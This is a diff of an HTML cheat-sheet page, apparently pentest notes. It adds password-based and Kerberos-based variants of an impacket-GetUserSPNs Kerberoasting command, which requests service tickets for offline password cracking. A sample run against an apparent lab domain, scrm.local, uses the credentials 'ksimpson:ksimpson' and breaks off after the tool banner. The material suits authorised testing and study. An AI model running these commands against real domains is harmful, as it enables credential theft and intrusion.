@@ -369,7 +369,10 @@ body.dark-mode #dynamicFormContainer button:hover {
 
 <button data-tabset="set2" data-tabcontent="tab2" >nxc</button>
 
-<div class="tabcontent" data-tabset="set2" data-tabcontent="tab1"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">sudo ntpdate -s &lt;DC&gt; &amp;&amp; impacket-GetUserSPNs -request &#39;&lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;&#39; -k -dc-host &lt;DC&gt;
+<div class="tabcontent" data-tabset="set2" data-tabcontent="tab1"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> With Password
+</span></span><span class="line"><span class="cl"><span class="go">sudo ntpdate -s &lt;DC&gt; &amp;&amp; impacket-GetUserSPNs -request &#39;&lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;&#39; -dc-ip &lt;DC&gt;
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> With Kerberos
+</span></span><span class="line"><span class="cl"><span class="go">sudo ntpdate -s &lt;DC&gt; &amp;&amp; impacket-GetUserSPNs -request &#39;&lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;&#39; -k -dc-host &lt;DC&gt;
 </span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> sudo ntpdate -s DC1.scrm.local <span class="o">&amp;&amp;</span> impacket-GetUserSPNs -request <span class="s1">&#39;scrm.local/ksimpson:ksimpson&#39;</span> -k -dc-host DC1.scrm.local
 </span></span><span class="line"><span class="cl"><span class="go">Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies 
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
